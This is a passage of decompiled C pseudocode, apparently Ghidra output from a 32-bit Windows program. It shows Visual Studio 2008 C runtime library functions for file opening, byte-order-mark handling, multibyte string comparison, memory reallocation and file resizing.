          if (local_18 != 5) goto LAB_00415b0e;
        }
LAB_004159a8:
        iVar12 = 0;
        if (local_6 == 1) {
          local_1c = 0xbfbbef;
          local_18 = 3;
        }
        else {
          if (local_6 != 2) goto LAB_00415b0e;
          local_1c = 0xfeff;
          local_18 = 2;
        }
        do {
          iVar9 = __write(*in_EAX,(void *)((int)&local_1c + iVar12),local_18 - iVar12);
          if (iVar9 == -1) goto LAB_00415887;
          iVar12 = iVar12 + iVar9;
        } while (iVar12 < (int)local_18);
      }
      else {
        if (uVar4 != 0x80000000) {
          if ((uVar4 == 0xc0000000) && (local_18 != 0)) {
            if (2 < local_18) {
              if (4 < local_18) goto LAB_0041599f;
              lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
              if (lVar14 != 0) {
                lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
                if (lVar14 == -1) goto LAB_00415887;
                goto LAB_004159f9;
              }
            }
            goto LAB_004159a8;
          }
          goto LAB_00415b0e;
        }
LAB_004159f9:
        iVar12 = __read_nolock(*in_EAX,&local_1c,3);
        if (iVar12 == -1) goto LAB_00415887;
        if (iVar12 == 2) {
LAB_00415a82:
          if ((local_1c & 0xffff) == 0xfffe) {
            __close_nolock(*in_EAX);
            piVar6 = __errno();
            *piVar6 = 0x16;
            return 0x16;
          }
          if ((local_1c & 0xffff) == 0xfeff) {
            lVar8 = __lseek_nolock(*in_EAX,2,0);
            if (lVar8 == -1) goto LAB_00415887;
            local_6 = 2;
            goto LAB_00415b0e;
          }
        }
        else if (iVar12 == 3) {
          if (local_1c == 0xbfbbef) {
            local_6 = 1;
            goto LAB_00415b0e;
          }
          goto LAB_00415a82;
        }
        uVar4 = __lseek_nolock(*in_EAX,0,0);
LAB_00415a74:
        if (uVar4 == 0xffffffff) goto LAB_00415887;
      }
    }
  }
LAB_00415b0e:
  uVar4 = local_c;
  pbVar1 = (byte *)((&DAT_00424fe0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 ^ (*pbVar1 ^ local_6) & 0x7f;
  pbVar1 = (byte *)((&DAT_00424fe0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = (char)(param_3 >> 0x10) << 7 | *pbVar1 & 0x7f;
  if ((local_7 == 0) && ((param_3 & 8) != 0)) {
    pbVar1 = (byte *)((&DAT_00424fe0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 | 0x20;
  }
  if (((local_c & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
    CloseHandle(local_20);
    pvVar10 = CreateFileA(param_2,uVar4 & 0x7fffffff,local_14,&local_34,3,local_10,(HANDLE)0x0);
    if (pvVar10 == (HANDLE)0xffffffff) {
      DVar7 = GetLastError();
      __dosmaperr(DVar7);
      pbVar1 = (byte *)((&DAT_00424fe0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
      __free_osfhnd(*in_EAX);
LAB_0041578e:
      piVar6 = __errno();
      return *piVar6;
    }
    *(HANDLE *)((*in_EAX & 0x1f) * 0x40 + (&DAT_00424fe0)[(int)*in_EAX >> 5]) = pvVar10;
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __sopen_helper
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__sopen_helper(char *_Filename,int _OFlag,int _ShFlag,int _PMode,int *_PFileHandle,int _BSecure)

{
  int *piVar1;
  errno_t eVar2;
  undefined4 local_20 [5];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00420c58;
  uStack_c = 0x415c1f;
  local_20[0] = 0;
  if (((_PFileHandle == (int *)0x0) || (*_PFileHandle = -1, _Filename == (char *)0x0)) ||
     ((_BSecure != 0 && ((_PMode & 0xfffffe7fU) != 0)))) {
    piVar1 = __errno();
    eVar2 = 0x16;
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    local_8 = (undefined *)0x0;
    eVar2 = __tsopen_nolock(local_20,_Filename,_OFlag,_ShFlag,(byte)_PMode);
    local_8 = (undefined *)0xfffffffe;
    FUN_00415cb1();
    if (eVar2 != 0) {
      *_PFileHandle = -1;
    }
  }
  return eVar2;
}



void FUN_00415cb1(void)

{
  byte *pbVar1;
  int unaff_EBP;
  int unaff_ESI;
  uint *unaff_EDI;
  
  if (*(int *)(unaff_EBP + -0x1c) != unaff_ESI) {
    if (*(int *)(unaff_EBP + -0x20) != unaff_ESI) {
      pbVar1 = (byte *)((&DAT_00424fe0)[(int)*unaff_EDI >> 5] + 4 + (*unaff_EDI & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
    }
    __unlock_fhandle(*unaff_EDI);
  }
  return;
}



// Library Function - Single Match
//  __sopen_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__sopen_s(int *_FileHandle,char *_Filename,int _OpenFlag,int _ShareFlag,int _PermissionMode)

{
  errno_t eVar1;
  
  eVar1 = __sopen_helper(_Filename,_OpenFlag,_ShareFlag,_PermissionMode,_FileHandle,1);
  return eVar1;
}



// Library Function - Single Match
//  __mbsnbicmp_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __mbsnbicmp_l(uchar *_Str1,uchar *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  size_t sVar1;
  uchar *puVar2;
  int iVar3;
  int *piVar4;
  uint uVar5;
  byte *pbVar6;
  _LocaleUpdate local_1c [4];
  int local_18;
  int local_14;
  char local_10;
  ushort local_c;
  ushort local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_1c,_Locale);
  if (_MaxCount == 0) {
    if (local_10 != '\0') {
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
    }
    iVar3 = 0;
  }
  else if (*(int *)(local_18 + 8) == 0) {
    iVar3 = __strnicmp((char *)_Str1,(char *)_Str2,_MaxCount);
    if (local_10 != '\0') {
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
    }
  }
  else if (_Str1 == (uchar *)0x0) {
    piVar4 = __errno();
    *piVar4 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_10 != '\0') {
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
    }
    iVar3 = 0x7fffffff;
  }
  else {
    if (_Str2 != (uchar *)0x0) {
      do {
        uVar5 = (uint)*_Str1;
        sVar1 = _MaxCount - 1;
        puVar2 = _Str1 + 1;
        if ((*(byte *)(uVar5 + 0x1d + local_18) & 4) == 0) {
          if ((*(byte *)(uVar5 + local_18 + 0x1d) & 0x10) != 0) {
            uVar5 = (uint)*(byte *)(uVar5 + local_18 + 0x11d);
          }
          local_c = (ushort)uVar5;
          _Str1 = puVar2;
LAB_00415e6f:
          uVar5 = (uint)*_Str2;
          pbVar6 = _Str2 + 1;
          if ((*(byte *)(uVar5 + 0x1d + local_18) & 4) == 0) {
            if ((*(byte *)(uVar5 + local_18 + 0x1d) & 0x10) != 0) {
              uVar5 = (uint)*(byte *)(uVar5 + local_18 + 0x11d);
            }
            goto LAB_00415ee9;
          }
          if (sVar1 == 0) {
LAB_00415e89:
            _MaxCount = sVar1;
            local_8 = 0;
          }
          else {
            sVar1 = _MaxCount - 2;
            if (*pbVar6 == 0) goto LAB_00415e89;
            local_8 = CONCAT11(*_Str2,*pbVar6);
            pbVar6 = _Str2 + 2;
            _MaxCount = sVar1;
            if ((local_8 < *(ushort *)(local_18 + 0x10)) || (*(ushort *)(local_18 + 0x12) < local_8)
               ) {
              if ((*(ushort *)(local_18 + 0x16) <= local_8) &&
                 (local_8 <= *(ushort *)(local_18 + 0x18))) {
                local_8 = local_8 + *(short *)(local_18 + 0x1a);
              }
            }
            else {
              local_8 = local_8 + *(short *)(local_18 + 0x14);
            }
          }
        }
        else {
          if (sVar1 != 0) {
            if (*puVar2 == '\0') {
              local_c = 0;
              _Str1 = puVar2;
            }
            else {
              local_c = CONCAT11(*_Str1,*puVar2);
              _Str1 = _Str1 + 2;
              if ((local_c < *(ushort *)(local_18 + 0x10)) ||
                 (*(ushort *)(local_18 + 0x12) < local_c)) {
                if ((*(ushort *)(local_18 + 0x16) <= local_c) &&
                   (local_c <= *(ushort *)(local_18 + 0x18))) {
                  local_c = local_c + *(short *)(local_18 + 0x1a);
                }
              }
              else {
                local_c = local_c + *(short *)(local_18 + 0x14);
              }
            }
            goto LAB_00415e6f;
          }
          uVar5 = (uint)*_Str2;
          if ((*(byte *)(uVar5 + 0x1d + local_18) & 4) != 0) {
LAB_00415f03:
            if (local_10 != '\0') {
              *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
            }
            return 0;
          }
          local_c = 0;
          pbVar6 = _Str2;
          _Str1 = puVar2;
LAB_00415ee9:
          local_8 = (ushort)uVar5;
          _MaxCount = sVar1;
        }
        if (local_8 != local_c) {
          iVar3 = (-(uint)(local_8 < local_c) & 2) - 1;
          if (local_10 == '\0') {
            return iVar3;
          }
          *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
          return iVar3;
        }
        if ((local_c == 0) || (_Str2 = pbVar6, _MaxCount == 0)) goto LAB_00415f03;
      } while( true );
    }
    piVar4 = __errno();
    *piVar4 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_10 != '\0') {
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
    }
    iVar3 = 0x7fffffff;
  }
  return iVar3;
}



// Library Function - Single Match
//  __mbsnbicmp
// 
// Library: Visual Studio 2008 Release

int __cdecl __mbsnbicmp(uchar *_Str1,uchar *_Str2,size_t _MaxCount)

{
  int iVar1;
  
  iVar1 = __mbsnbicmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __mbsnbcmp_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __mbsnbcmp_l(uchar *_Str1,uchar *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  size_t sVar1;
  uchar *puVar2;
  byte bVar3;
  int iVar4;
  int *piVar5;
  uint uVar6;
  ushort uVar7;
  byte *pbVar8;
  _LocaleUpdate local_14 [4];
  int local_10;
  int local_c;
  char local_8;
  
  if (_MaxCount == 0) {
    iVar4 = 0;
  }
  else {
    _LocaleUpdate::_LocaleUpdate(local_14,_Locale);
    if (*(int *)(local_10 + 8) == 0) {
      iVar4 = _strncmp((char *)_Str1,(char *)_Str2,_MaxCount);
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
    }
    else if (_Str1 == (uchar *)0x0) {
      piVar5 = __errno();
      *piVar5 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      iVar4 = 0x7fffffff;
    }
    else {
      if (_Str2 != (uchar *)0x0) {
        do {
          bVar3 = *_Str1;
          uVar7 = (ushort)bVar3;
          sVar1 = _MaxCount - 1;
          puVar2 = _Str1 + 1;
          if ((*(byte *)(bVar3 + 0x1d + local_10) & 4) == 0) {
LAB_00416053:
            _Str1 = puVar2;
            uVar6 = (uint)*_Str2;
            pbVar8 = _Str2 + 1;
            if ((*(byte *)(uVar6 + 0x1d + local_10) & 4) != 0) {
              if (sVar1 != 0) {
                sVar1 = _MaxCount - 2;
                if (*pbVar8 != 0) {
                  uVar6 = (uint)CONCAT11(*_Str2,*pbVar8);
                  pbVar8 = _Str2 + 2;
                  goto LAB_00416085;
                }
              }
              _MaxCount = sVar1;
              uVar6 = 0;
              sVar1 = _MaxCount;
            }
          }
          else {
            if (sVar1 != 0) {
              if (*puVar2 == '\0') {
                uVar7 = 0;
              }
              else {
                uVar7 = CONCAT11(bVar3,*puVar2);
                puVar2 = _Str1 + 2;
              }
              goto LAB_00416053;
            }
            uVar6 = (uint)*_Str2;
            uVar7 = 0;
            pbVar8 = _Str2;
            _Str1 = puVar2;
            if ((*(byte *)(uVar6 + 0x1d + local_10) & 4) != 0) {
LAB_00416023:
              if (local_8 != '\0') {
                *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
              }
              return 0;
            }
          }
LAB_00416085:
          _MaxCount = sVar1;
          if ((ushort)uVar6 != uVar7) {
            iVar4 = (-(uint)((ushort)uVar6 < uVar7) & 2) - 1;
            if (local_8 == '\0') {
              return iVar4;
            }
            *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
            return iVar4;
          }
          if ((uVar7 == 0) || (_Str2 = pbVar8, _MaxCount == 0)) goto LAB_00416023;
        } while( true );
      }
      piVar5 = __errno();
      *piVar5 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      iVar4 = 0x7fffffff;
    }
  }
  return iVar4;
}



// Library Function - Single Match
//  __mbsnbcmp
// 
// Library: Visual Studio 2008 Release

int __cdecl __mbsnbcmp(uchar *_Str1,uchar *_Str2,size_t _MaxCount)

{
  int iVar1;
  
  iVar1 = __mbsnbcmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  ___crtGetStringTypeW
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl
___crtGetStringTypeW
          (localeinfo_struct *param_1,DWORD param_2,LPCWSTR param_3,int param_4,LPWORD param_5)

{
  BOOL BVar1;
  _LocaleUpdate local_14 [8];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_14,param_1);
  if (param_4 < -1) {
    BVar1 = 0;
  }
  else {
    BVar1 = GetStringTypeW(param_2,param_3,param_4,param_5);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return BVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _realloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _realloc(void *_Memory,size_t _NewSize)

{
  void *pvVar1;
  int iVar2;
  uint *puVar3;
  int *piVar4;
  DWORD DVar5;
  LPVOID pvVar6;
  uint *local_24;
  int *local_20;
  
  if (_Memory == (void *)0x0) {
    pvVar1 = _malloc(_NewSize);
    return pvVar1;
  }
  if (_NewSize == 0) {
    _free(_Memory);
    return (void *)0x0;
  }
  if (DAT_0042510c == 3) {
    do {
      local_20 = (int *)0x0;
      if ((uint *)0xffffffe0 < _NewSize) goto LAB_004162df;
      __lock(4);
      local_24 = (uint *)___sbh_find_block((int)_Memory);
      if (local_24 != (uint *)0x0) {
        if (_NewSize <= DAT_004250fc) {
          iVar2 = ___sbh_resize_block(local_24,(int)_Memory,_NewSize);
          if (iVar2 == 0) {
            local_20 = ___sbh_alloc_block((uint *)_NewSize);
            if (local_20 != (int *)0x0) {
              puVar3 = (uint *)(*(int *)((int)_Memory + -4) - 1);
              if (_NewSize <= puVar3) {
                puVar3 = (uint *)_NewSize;
              }
              _memcpy(local_20,_Memory,(size_t)puVar3);
              local_24 = (uint *)___sbh_find_block((int)_Memory);
              ___sbh_free_block(local_24,(int)_Memory);
            }
          }
          else {
            local_20 = (int *)_Memory;
          }
        }
        if (local_20 == (int *)0x0) {
          if ((uint *)_NewSize == (uint *)0x0) {
            _NewSize = 1;
          }
          _NewSize = _NewSize + 0xf & 0xfffffff0;
          local_20 = (int *)HeapAlloc(DAT_004237bc,0,_NewSize);
          if (local_20 != (int *)0x0) {
            puVar3 = (uint *)(*(int *)((int)_Memory + -4) - 1);
            if (_NewSize <= puVar3) {
              puVar3 = (uint *)_NewSize;
            }
            _memcpy(local_20,_Memory,(size_t)puVar3);
            ___sbh_free_block(local_24,(int)_Memory);
          }
        }
      }
      FUN_0041624a();
      if (local_24 == (uint *)0x0) {
        if ((uint *)_NewSize == (uint *)0x0) {
          _NewSize = 1;
        }
        _NewSize = _NewSize + 0xf & 0xfffffff0;
        local_20 = (int *)HeapReAlloc(DAT_004237bc,0,_Memory,_NewSize);
      }
      if (local_20 != (int *)0x0) {
        return local_20;
      }
      if (DAT_00423c60 == 0) {
        piVar4 = __errno();
        if (local_24 != (uint *)0x0) {
          *piVar4 = 0xc;
          return (void *)0x0;
        }
        goto LAB_0041630c;
      }
      iVar2 = __callnewh(_NewSize);
    } while (iVar2 != 0);
    piVar4 = __errno();
    if (local_24 != (uint *)0x0) goto LAB_004162eb;
  }
  else {
    do {
      if ((uint *)0xffffffe0 < _NewSize) goto LAB_004162df;
      if ((uint *)_NewSize == (uint *)0x0) {
        _NewSize = 1;
      }
      pvVar6 = HeapReAlloc(DAT_004237bc,0,_Memory,_NewSize);
      if (pvVar6 != (LPVOID)0x0) {
        return pvVar6;
      }
      if (DAT_00423c60 == 0) {
        piVar4 = __errno();
LAB_0041630c:
        DVar5 = GetLastError();
        iVar2 = __get_errno_from_oserr(DVar5);
        *piVar4 = iVar2;
        return (void *)0x0;
      }
      iVar2 = __callnewh(_NewSize);
    } while (iVar2 != 0);
    piVar4 = __errno();
  }
  DVar5 = GetLastError();
  iVar2 = __get_errno_from_oserr(DVar5);
  *piVar4 = iVar2;
  return (void *)0x0;
LAB_004162df:
  __callnewh(_NewSize);
  piVar4 = __errno();
LAB_004162eb:
  *piVar4 = 0xc;
  return (void *)0x0;
}



void FUN_0041624a(void)

{
  FUN_0040e64c(4);
  return;
}



// Library Function - Single Match
//  __chsize_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __chsize_nolock(int _FileHandle,longlong _Size)

{
  int iVar1;
  HANDLE pvVar2;
  LPVOID _Buf;
  int *piVar3;
  int iVar4;
  uint uVar5;
  ulong *puVar6;
  BOOL BVar7;
  uint uVar8;
  int unaff_EDI;
  int iVar9;
  bool bVar10;
  bool bVar11;
  ulonglong uVar12;
  longlong lVar13;
  uint in_stack_00000008;
  DWORD DVar14;
  SIZE_T dwBytes;
  uint local_14;
  uint local_10;
  
  local_14 = 0;
  local_10 = 0;
  uVar12 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
  if (uVar12 == 0xffffffffffffffff) goto LAB_004163a9;
  lVar13 = __lseeki64_nolock(_FileHandle,0x200000000,unaff_EDI);
  iVar4 = (int)((ulonglong)lVar13 >> 0x20);
  if (lVar13 == -1) goto LAB_004163a9;
  uVar8 = in_stack_00000008 - (uint)lVar13;
  uVar5 = (uint)(in_stack_00000008 < (uint)lVar13);
  iVar1 = (int)_Size - iVar4;
  iVar9 = iVar1 - uVar5;
  if ((iVar9 < 0) ||
     ((iVar9 == 0 || (SBORROW4((int)_Size,iVar4) != SBORROW4(iVar1,uVar5)) != iVar9 < 0 &&
      (uVar8 == 0)))) {
    if ((iVar9 < 1) && (iVar9 < 0)) {
      lVar13 = __lseeki64_nolock(_FileHandle,_Size & 0xffffffff,unaff_EDI);
      if (lVar13 == -1) goto LAB_004163a9;
      pvVar2 = (HANDLE)__get_osfhandle(_FileHandle);
      BVar7 = SetEndOfFile(pvVar2);
      local_14 = (BVar7 != 0) - 1;
      local_10 = (int)local_14 >> 0x1f;
      if ((local_14 & local_10) == 0xffffffff) {
        piVar3 = __errno();
        *piVar3 = 0xd;
        puVar6 = ___doserrno();
        DVar14 = GetLastError();
        *puVar6 = DVar14;
        goto LAB_004164a7;
      }
    }
  }
  else {
    dwBytes = 0x1000;
    DVar14 = 8;
    pvVar2 = GetProcessHeap();
    _Buf = HeapAlloc(pvVar2,DVar14,dwBytes);
    if (_Buf == (LPVOID)0x0) {
      piVar3 = __errno();
      *piVar3 = 0xc;
      goto LAB_004163a9;
    }
    iVar4 = __setmode_nolock(_FileHandle,0x8000);
    while( true ) {
      uVar5 = uVar8;
      if ((-1 < iVar9) && ((0 < iVar9 || (0xfff < uVar8)))) {
        uVar5 = 0x1000;
      }
      uVar5 = __write_nolock(_FileHandle,_Buf,uVar5);
      if (uVar5 == 0xffffffff) break;
      bVar10 = uVar8 < uVar5;
      uVar8 = uVar8 - uVar5;
      bVar11 = SBORROW4(iVar9,(int)uVar5 >> 0x1f);
      iVar1 = iVar9 - ((int)uVar5 >> 0x1f);
      iVar9 = iVar1 - (uint)bVar10;
      if ((iVar9 < 0) ||
         ((iVar9 == 0 || (bVar11 != SBORROW4(iVar1,(uint)bVar10)) != iVar9 < 0 && (uVar8 == 0))))
      goto LAB_004163fb;
    }
    puVar6 = ___doserrno();
    if (*puVar6 == 5) {
      piVar3 = __errno();
      *piVar3 = 0xd;
    }
    local_14 = 0xffffffff;
    local_10 = 0xffffffff;
LAB_004163fb:
    __setmode_nolock(_FileHandle,iVar4);
    DVar14 = 0;
    pvVar2 = GetProcessHeap();
    HeapFree(pvVar2,DVar14,_Buf);
LAB_004164a7:
    if ((local_14 & local_10) == 0xffffffff) goto LAB_004163a9;
  }
  lVar13 = __lseeki64_nolock(_FileHandle,uVar12 >> 0x20,unaff_EDI);
  if (lVar13 != -1) {
    return 0;
  }
LAB_004163a9:
  piVar3 = __errno();
  return *piVar3;
}



// Library Function - Single Match
//  __setmode_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __setmode_nolock(int _FileHandle,int _Mode)

{
  int iVar1;
  int *piVar2;
  char cVar3;
  byte bVar4;
  byte *pbVar5;
  byte bVar6;
  int iVar7;
  
  piVar2 = &DAT_00424fe0 + (_FileHandle >> 5);
  iVar7 = (_FileHandle & 0x1fU) * 0x40;
  iVar1 = *piVar2 + iVar7;
  cVar3 = *(char *)(iVar1 + 0x24);
  bVar4 = *(byte *)(iVar1 + 4);
  if (_Mode == 0x4000) {
    *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
    pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
    *pbVar5 = *pbVar5 & 0x80;
  }
  else if (_Mode == 0x8000) {
    *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) & 0x7f;
  }
  else {
    if ((_Mode == 0x10000) || (_Mode == 0x20000)) {
      *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x82 | 2;
    }
    else {
      if (_Mode != 0x40000) goto LAB_00416575;
      *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x81 | 1;
    }
    *pbVar5 = bVar6;
  }
LAB_00416575:
  if ((bVar4 & 0x80) == 0) {
    return 0x8000;
  }
  return (-(uint)((char)(cVar3 * '\x02') >> 1 != '\0') & 0xc000) + 0x4000;
}



// Library Function - Single Match
//  __get_fmode
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __get_fmode(int *_PMode)

{
  int *piVar1;
  errno_t eVar2;
  
  if (_PMode == (int *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    eVar2 = 0x16;
  }
  else {
    *_PMode = DAT_00424010;
    eVar2 = 0;
  }
  return eVar2;
}



// Library Function - Single Match
//  ___initconout
// 
// Library: Visual Studio 2008 Release

void __cdecl ___initconout(void)

{
  DAT_00422f34 = CreateFileA(s_CONOUT__0041d544,0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                             (HANDLE)0x0);
  return;
}



// Library Function - Single Match
//  __flswbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __flswbuf(int _Ch,FILE *_File)

{
  uint uVar1;
  char *_Buf;
  char *pcVar2;
  uint _FileHandle;
  int *piVar3;
  undefined **ppuVar4;
  int iVar5;
  undefined *puVar6;
  int unaff_EDI;
  uint _MaxCharCount;
  longlong lVar7;
  undefined4 local_8;
  
  _FileHandle = __fileno(_File);
  uVar1 = _File->_flag;
  if ((uVar1 & 0x82) == 0) {
    piVar3 = __errno();
    *piVar3 = 9;
LAB_0041663e:
    _File->_flag = _File->_flag | 0x20;
    return 0xffff;
  }
  if ((uVar1 & 0x40) != 0) {
    piVar3 = __errno();
    *piVar3 = 0x22;
    goto LAB_0041663e;
  }
  if ((uVar1 & 1) != 0) {
    _File->_cnt = 0;
    if ((uVar1 & 0x10) == 0) {
      _File->_flag = uVar1 | 0x20;
      return 0xffff;
    }
    _File->_ptr = _File->_base;
    _File->_flag = uVar1 & 0xfffffffe;
  }
  uVar1 = _File->_flag;
  _File->_cnt = 0;
  local_8 = 0;
  _MaxCharCount = 2;
  _File->_flag = uVar1 & 0xffffffef | 2;
  if (((uVar1 & 0x10c) == 0) &&
     (((ppuVar4 = FUN_0040b204(), _File != (FILE *)(ppuVar4 + 8) &&
       (ppuVar4 = FUN_0040b204(), _File != (FILE *)(ppuVar4 + 0x10))) ||
      (iVar5 = __isatty(_FileHandle), iVar5 == 0)))) {
    __getbuf(_File);
  }
  if ((_File->_flag & 0x108U) == 0) {
    local_8 = CONCAT22(local_8._2_2_,(short)_Ch);
    local_8 = __write(_FileHandle,&local_8,2);
  }
  else {
    _Buf = _File->_base;
    pcVar2 = _File->_ptr;
    _File->_ptr = _Buf + 2;
    _MaxCharCount = (int)pcVar2 - (int)_Buf;
    _File->_cnt = _File->_bufsiz + -2;
    if ((int)_MaxCharCount < 1) {
      if ((_FileHandle == 0xffffffff) || (_FileHandle == 0xfffffffe)) {
        puVar6 = &DAT_00422d78;
      }
      else {
        puVar6 = (undefined *)((_FileHandle & 0x1f) * 0x40 + (&DAT_00424fe0)[(int)_FileHandle >> 5])
        ;
      }
      if (((puVar6[4] & 0x20) != 0) &&
         (lVar7 = __lseeki64(_FileHandle,0x200000000,unaff_EDI), lVar7 == -1)) goto LAB_00416775;
    }
    else {
      local_8 = __write(_FileHandle,_Buf,_MaxCharCount);
    }
    *(short *)_File->_base = (short)_Ch;
  }
  if (local_8 == _MaxCharCount) {
    return _Ch & 0xffff;
  }
LAB_00416775:
  _File->_flag = _File->_flag | 0x20;
  return 0xffff;
}



// Library Function - Single Match
//  _abort
// 
// Library: Visual Studio 2008 Release

void __cdecl _abort(void)

{
  code *pcVar1;
  _PHNDLR p_Var2;
  EXCEPTION_RECORD local_32c;
  _EXCEPTION_POINTERS local_2dc;
  undefined4 local_2d4;
  
  if ((DAT_00422f38 & 1) != 0) {
    __NMSG_WRITE(10);
  }
  p_Var2 = ___get_sigabrt();
  if (p_Var2 != (_PHNDLR)0x0) {
    _raise(0x16);
  }
  if ((DAT_00422f38 & 2) != 0) {
    local_2d4 = 0x10001;
    _memset(&local_32c,0,0x50);
    local_2dc.ExceptionRecord = &local_32c;
    local_2dc.ContextRecord = (PCONTEXT)&local_2d4;
    local_32c.ExceptionCode = 0x40000015;
    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
    UnhandledExceptionFilter(&local_2dc);
  }
  __exit(3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __isdigit_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __isdigit_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((int)(local_14.locinfo)->locale_name[3] < 2) {
    uVar1 = *(ushort *)(local_14.locinfo[1].lc_category[0].locale + _C * 2) & 4;
  }
  else {
    uVar1 = __isctype_l(_C,4,&local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// Library Function - Single Match
//  _isdigit
// 
// Library: Visual Studio 2008 Release

int __cdecl _isdigit(int _C)

{
  int iVar1;
  
  if (DAT_00423c80 == 0) {
    return *(ushort *)(PTR_DAT_00422d48 + _C * 2) & 4;
  }
  iVar1 = __isdigit_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  ___ansicp
// 
// Library: Visual Studio 2008 Release

void __cdecl ___ansicp(LCID param_1)

{
  int iVar1;
  CHAR local_10 [6];
  undefined local_a;
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  local_a = 0;
  iVar1 = GetLocaleInfoA(param_1,0x1004,local_10,6);
  if (iVar1 != 0) {
    _atol(local_10);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  ___convertcp
// 
// Library: Visual Studio 2008 Release

void __cdecl
___convertcp(UINT param_1,UINT param_2,char *param_3,uint *param_4,LPSTR param_5,int param_6)

{
  uint _Size;
  uint cbMultiByte;
  bool bVar1;
  BOOL BVar2;
  size_t sVar3;
  undefined4 *puVar4;
  int iVar5;
  LPSTR lpMultiByteStr;
  uint uVar6;
